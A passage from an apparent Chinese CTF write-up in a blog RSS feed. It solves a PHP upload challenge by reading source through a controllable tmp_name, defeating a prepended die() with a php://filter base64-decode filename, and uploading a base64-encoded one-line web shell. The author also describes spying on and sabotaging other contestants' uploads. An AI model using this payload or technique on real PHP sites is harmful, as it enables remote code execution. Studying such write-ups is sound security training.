class="string">"pictures1"</span>&gt;</span><br><span class="line">&lt;input <span class="variable">type=</span><span class="string">"file"</span> <span class="variable">name=</span><span class="string">"pictures2"</span>&gt;</span><br><span class="line">&lt;input <span class="variable">type=</span><span class="string">"file"</span> <span class="variable">name=</span><span class="string">"pictures3"</span>&gt;</span><br><span class="line">&lt;input <span class="variable">type=</span><span class="string">"submit"</span> <span class="variable">value=</span><span class="string">"submit"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后根据博客中的描述，发现有一下两种情况:<br><img src="http://qn.lazysheep.cc/img/baimaowj1.png" alt="baimao"><br>和<br><img src="http://qn.lazysheep.cc/img/baimaowj2.png" alt="baimao"></p>
<p>上图中还带了一个正常情况下<code>$_FILES</code>的键值</p>
<p>在乌云峰会当时RR菊苣日题的情况能分析出此题大致的流程: 通过文件读取之类的函数获取上传缓存文件的内容 -&gt; 进行base64编码 -&gt; 存入数据库 -&gt; 当访问相应的链接时 -&gt; 请求数据库，获取该文件base64编码的内容 -&gt; base64解码后开头加上字符串<code>&lt;?php die;?&gt;</code> -&gt; 写入<code>upload</code>目录下 -&gt; 读取该文件</p>
<p>然后也有大致的日题思路: 通过文件上传这类的漏洞读取源码 -&gt; 代码审计，根据提示是base64解码这里有某些bug，通过该bug可以把干掉死亡之<code>die</code></p>
<p>根据上述的流程和思路，第一步大致很清晰了，通过某些方法，使<code>tmp_name</code>可控，则可以读取任意文件base64编码后存入数据库，根据该思路猜测上述CVE大致的利用方法：<br><img src="http://qn.lazysheep.cc/img/baimaowj3.png" alt="baimao"></p>
<p>PS: 文件名和缓存文件名是必须的两个参数</p>
<p>一般我们获取文件名和缓冲文件名是使用<code>$_FILES[&#39;xxx&#39;][&#39;name&#39;]; $_FILES[&#39;xxx&#39;][&#39;tmp_name&#39;]</code><br>而该题是多文件上传，所以可猜测是使用<code>$_FILES[&#39;xxx&#39;][&#39;name&#39;][$key]; $_FILES[&#39;xxx&#39;][&#39;tmp_name&#39;][$key]</code><br>当<code>$key = &quot;[name&quot;</code> 时, <code>$_FILES[&#39;xxx&#39;][&#39;tmp_name&#39;][$key]</code>是可控的</p>
<p>而第二步猜测在比赛前却没搜到答案</p>
<hr>
<p>开始做题，第一步和我猜想的几乎一样，但是在回家上电梯的时候，我却想到一个搅屎的方法，因为该题上传的每一个文件，都有一个对应的链接，比如: <code>index.php?download=803&amp;filename=upload/evilddog2</code>, 在该链接点击之前，<code>upload</code>目录下是不存在我上传的<code>evilddog2</code>文件，当我点击个链接后，才会存在该文件，同时该链接失效.</p>
<p>根据该流程，我可以写一个脚本，去访问别人上传的文件，会导致: 1.以为自己没上传成功(其实成功了，在upload目录下会产生该文件). 2. 我可以看别人的做题进度，思路之类的. </p>
<p>比如，该题的第一份源码不是我自己日出来的，是我随便点了一个<code>ccc</code>的的文件出来的.</p>
<p>还是说说正规的思路吧:<br><img src="http://qn.lazysheep.cc/img/baimaowj4.png" alt="baimao"></p>
<p>右边这个链接<code>index.php?download=803&amp;filename=upload/evilddog2</code>点开后就是<code>index.php</code>的源码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL^E_NOTICE^E_WARNING);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'init.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nowtime</span> = time();</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$_FILES</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//var_dump($_FILES);</span></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$_FILES</span>[<span class="string">"homework"</span>][<span class="string">"name"</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">"homework"</span>][<span class="string">"name"</span>][<span class="variable">$key</span>]))</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="variable">$filename</span> = htmlspecialchars(<span class="variable">$_FILES</span>[<span class="string">"homework"</span>][<span class="string">"name"</span>][<span class="variable">$key</span>]);</span><br><span class="line">			<span class="variable">$tmpFile</span> = <span class="variable">$_FILES</span>[<span class="string">"homework"</span>][<span class="string">"tmp_name"</span>][<span class="variable">$key</span>];</span><br><span class="line">			<span class="comment">//$size =  $_FILES["homework"]["size"][$key];</span></span><br><span class="line">		<span class="comment">//	echo $tmpFile;</span></span><br><span class="line">			<span class="variable">$content</span> = base64_encode(file_get_contents(<span class="variable">$tmpFile</span>));</span><br><span class="line">			<span class="variable">$echoCentent</span>[] = <span class="variable">$content</span>;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$content</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$sql</span> = <span class="string">"insert into homework(`filename`,`content`,`time`) values('"</span>.<span class="variable">$filename</span>.<span class="string">"','"</span>.<span class="variable">$content</span>.<span class="string">"','"</span>.<span class="variable">$nowtime</span>.<span class="string">"')"</span>;</span><br><span class="line">				<span class="keyword">if</span>(!mysql_query(<span class="variable">$sql</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'hello hacker!'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'download'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'filename'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$download</span> = addslashes(htmlspecialchars_decode(<span class="variable">$_GET</span>[<span class="string">'download'</span>]));</span><br><span class="line">	<span class="variable">$filename</span> = addslashes(htmlspecialchars_decode(<span class="variable">$_GET</span>[<span class="string">'filename'</span>]));</span><br><span class="line">	<span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		unlink(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">"select content from homework where id='$download'"</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$devalContents</span> = <span class="string">"&lt;?php die; ?&gt;\n"</span>; </span><br><span class="line">		<span class="variable">$devalContents</span> .= base64_decode(<span class="variable">$row</span>[<span class="string">'content'</span>]);</span><br><span class="line">		file_put_contents(<span class="string">"$filename"</span>,<span class="variable">$devalContents</span>);</span><br><span class="line">		<span class="variable">$filename</span> = str_replace(<span class="string">"upload/"</span>,<span class="string">''</span>,<span class="variable">$filename</span>);</span><br><span class="line">		header(<span class="string">"location:upload/"</span>.urlencode(<span class="variable">$filename</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">"delete from homework where id='$download';"</span>;</span><br><span class="line">	<span class="keyword">if</span>(!mysql_query(<span class="variable">$sql</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"hello hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//PS:只贴PHP部分</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面就是该题的主要的源码了，然后就是进入下一步，关键代码:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$devalContents</span> = <span class="string">"&lt;?php die; ?&gt;\n"</span>; </span><br><span class="line"><span class="variable">$devalContents</span> .= base64_decode(<span class="variable">$row</span>[<span class="string">'content'</span>]);</span><br><span class="line">file_put_contents(<span class="string">"<span class="variable">$filename</span>"</span>,<span class="variable">$devalContents</span>);</span><br><span class="line"><span class="variable">$filename</span> = str_replace(<span class="string">"upload/"</span>,<span class="string">''</span>,<span class="variable">$filename</span>);</span><br><span class="line">header(<span class="string">"location:upload/"</span>.urlencode(<span class="variable">$filename</span>));</span><br></pre></td></tr></table></figure></p>
<p>搜到了一个链接<a href="http://www.2cto.com/Article/201303/192410.html" target="_blank" rel="external">http://www.2cto.com/Article/201303/192410.html</a></p>
<p>我们发现<code>$filename</code>是可控参数，所以可以利用伪协议:<code>php://filter/write=convert.base64-decode/resource=upload/ddog.php</code></p>
<p>也就是说，把<code>$devalContents</code>变量的内容进行base64解码后写入<code>upload/ddog.php</code>文件.</p>
<p>这里有一个地方需要注意，会出现Incorrect padding错误，在php中不会提示，以下是python运行结果:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="tag">p</span></span><br><span class="line"><span class="string">'&lt;?php die; ?&gt;\n'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; payload</span><br><span class="line"><span class="string">'&lt;?php phpinfo();?&gt;'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; x1 = base64.<span class="function"><span class="title">b64encode</span><span class="params">(payload)</span></span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; base64.<span class="function"><span class="title">b64decode</span><span class="params">(p+x1)</span></span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/base64.py"</span>, line <span class="number">78</span>, <span class="keyword">in</span> b64decode</span><br><span class="line">    raise <span class="function"><span class="title">TypeError</span><span class="params">(msg)</span></span></span><br><span class="line">TypeError: Incorrect <span class="attribute">padding</span></span><br><span class="line">Incorrect <span class="attribute">padding</span></span><br></pre></td></tr></table></figure></p>
<p>所以我们需要填充字符</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.<span class="function"><span class="title">b64decode</span><span class="params">(p+<span class="string">"s"</span>+x1)</span></span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/base64.py"</span>, line <span class="number">78</span>, <span class="keyword">in</span> b64decode</span><br><span class="line">    raise <span class="function"><span class="title">TypeError</span><span class="params">(msg)</span></span></span><br><span class="line">TypeError: Incorrect <span class="attribute">padding</span></span><br><span class="line">Incorrect <span class="attribute">padding</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; base64.<span class="function"><span class="title">b64decode</span><span class="params">(p+<span class="string">"ss"</span>+x1)</span></span></span><br><span class="line"><span class="string">'\xa6\x1a]\x89\xeb,&lt;?php phpinfo();?&gt;'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; x1</span><br><span class="line"><span class="string">'PD9waHAgcGhwaW5mbygpOz8+'</span></span><br></pre></td></tr></table></figure>
<p>如果我们把<code>ssPD9waHAgcGhwaW5mbygpOz8+</code>作为文件内容<br><code>php://filter/write=convert.base64-decode/resource=upload/ddog.php</code>作为文件名<br>则将会在<code>upload/ddog.php</code>中写入<code>\xa6\x1a]\x89\xeb,&lt;?php phpinfo();?&gt;</code></p>
<p>成功bypass死亡之<code>die</code></p>
<p>上传内容为:<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: <span class="string">form-data; name="homework[]"; filename="evilddog2"</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">application/x-php</span></span><br><span class="line"></span><br><span class="line"><span class="gcode">ssPD<span class="number">9</span>waHAgJF<span class="number">9</span>HRVRbYV<span class="number">0</span>oJF<span class="number">9</span>QT<span class="number">1</span><span class="label">NUW2</span>Z<span class="number">1</span>Y<span class="number">2</span>tkZ<span class="keyword">G9</span><span class="label">nXSk7</span>Pz<span class="number">4</span></span></span><br></pre></td></tr></table></figure></p>
<p>访问链接: <code>/index.php?download=711&amp;filename=php://filter/write=convert.base64-decode/resource=upload/fuckevilddog.php</code></p>
<p>连上蚁剑, GetFlag!<br><img src="http://qn.lazysheep.cc/img/baimaowj5.png" alt="baimao"></p>
]]></content:encoded>
      <comments>http://0x48.pw/2016/07/14/0x1E/#disqus_comments</comments>
    </item>
    
  </channel>
</rss>